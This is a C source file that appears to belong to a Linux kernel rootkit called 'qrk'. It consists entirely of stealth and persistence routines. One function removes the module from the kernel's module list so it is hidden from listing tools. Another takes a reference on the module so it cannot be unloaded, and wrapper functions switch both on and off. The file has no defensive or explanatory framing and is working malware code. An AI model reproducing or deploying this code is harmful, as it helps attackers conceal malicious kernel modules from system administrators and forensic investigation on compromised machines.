#include "qrk_common.h"

struct list_head *module_list;
int is_hidden = 0;
int is_protected = 0;

void qrk_hide(void)
{
    if (is_hidden)
    {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    is_hidden = 1;
}

void qrk_unhide(void)
{
    if (!is_hidden)
    {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    is_hidden = 0;
}

void qrk_protect(void)
{
    if (is_protected)
    {
        return;
    }

    try_module_get(THIS_MODULE);

    is_protected = 1;
}

void qrk_unprotect(void)
{
    if (!is_protected)
    {
        return;
    }

    module_put(THIS_MODULE);

    is_protected = 0;
}

void self_protect_on(void)
{
    qrk_hide();
    qrk_protect();
}
void self_protect_off(void)
{
    qrk_unhide();
    qrk_unprotect();
}
